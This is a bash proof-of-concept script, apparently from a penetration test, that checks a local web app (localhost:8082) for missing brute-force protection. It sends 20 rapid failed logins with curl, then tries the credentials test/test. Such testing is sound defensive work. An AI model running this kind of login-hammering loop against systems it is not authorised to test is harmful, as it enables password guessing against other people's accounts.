#!/bin/bash
# POC: No Brute Force Protection on Authentication
# Target: http://localhost:8082

TARGET="http://localhost:8082"

echo "=== Brute Force Protection Test ==="
echo "Target: $TARGET"
echo ""

echo "[*] Sending 20 rapid failed authentication attempts..."
FAIL_COUNT=0
for i in $(seq 1 20); do
  RESPONSE=$(curl -s -w "%{http_code}" -o /dev/null -X POST "$TARGET/password/test" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=test&user_id=10032&password=wrong_password_$i")
  
  if [ "$RESPONSE" == "302" ]; then
    FAIL_COUNT=$((FAIL_COUNT + 1))
  fi
  
  echo -n "."
done
echo ""
echo "[*] All $FAIL_COUNT failed attempts were accepted (no blocking)"
echo ""

echo "[*] Testing if legitimate credentials still work after failed attempts..."
RESPONSE=$(curl -s -i -X POST "$TARGET/password/test" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&user_id=10032&password=test")

if echo "$RESPONSE" | grep -q "dashboard"; then
    echo "[!] VULNERABILITY CONFIRMED!"
    echo "[!] After 20 failed attempts, legitimate login still works"
    echo "[!] No rate limiting, no account lockout, no CAPTCHA"
    echo "[!] Application is vulnerable to brute force attacks"
    exit 0
else
    echo "[-] Account appears to be locked"
    exit 1
fi
